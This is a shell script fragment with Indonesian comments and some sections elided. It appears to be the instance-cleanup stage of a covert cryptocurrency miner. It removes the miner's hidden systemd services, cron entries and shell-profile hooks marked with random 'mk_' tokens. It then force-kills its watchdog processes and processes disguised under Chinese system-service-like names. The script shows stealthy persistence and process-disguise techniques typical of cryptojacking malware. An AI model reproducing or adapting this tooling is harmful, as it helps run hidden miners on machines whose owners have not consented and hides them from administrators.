...
# Kalau process di-kill duluan, systemd/cron restart <1 detik → double lagi.

MARKER_FILE="$HOME/.cache/.miner_instance"

# Step 1: Stop & disable semua systemd service sisa
for f in "$HOME"/.config/systemd/user/svc-*.service /etc/systemd/system/svc-*.service; do
    [ -f "$f" ] || continue
...
# Step 2: Bersihin cron (sebelum kill, biar gak restart)
rm -f /etc/cron.d/.sys_mk_* 2>/dev/null || true
if command -v crontab >/dev/null 2>&1; then
    crontab -l 2>/dev/null | grep -v 'mk_[a-z0-9]\{8\}' | crontab - 2>/dev/null || true
fi

# Step 3: Bersihin rc hooks & profile.d
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
    [ -f "$rc" ] || continue
    grep -q 'mk_[a-z0-9]\{8\}' "$rc" 2>/dev/null || continue
    grep -v 'mk_[a-z0-9]\{8\}' "$rc" > "${rc}.t" 2>/dev/null && mv "${rc}.t" "$rc" 2>/dev/null || true
done
...
if [ -f "$MARKER_FILE" ]; then
    ...
    [ -n "$OLD_WD" ] && [ -d "$OLD_WD" ] && { pgrep -f "$OLD_WD" 2>/dev/null | xargs -r kill -9 2>/dev/null || true; }
    rm -f "$MARKER_FILE" 2>/dev/null || true
fi

# Step 5: Kill semua process — persistence udah mati, gak bakal restart
ps aux | grep -E '[系统核心缓存管理数据库维护守护进程网络存储日志监控引擎调度备份同步服务安全认证配置]{2,}' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null || true
pgrep -f 'wd_[a-z0-9]' 2>/dev/null | xargs -r kill -9 2>/dev/null || true
ps aux | grep '/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null || true
...
# Step 7: Baru hapus workdir — setelah yakin semua process mati
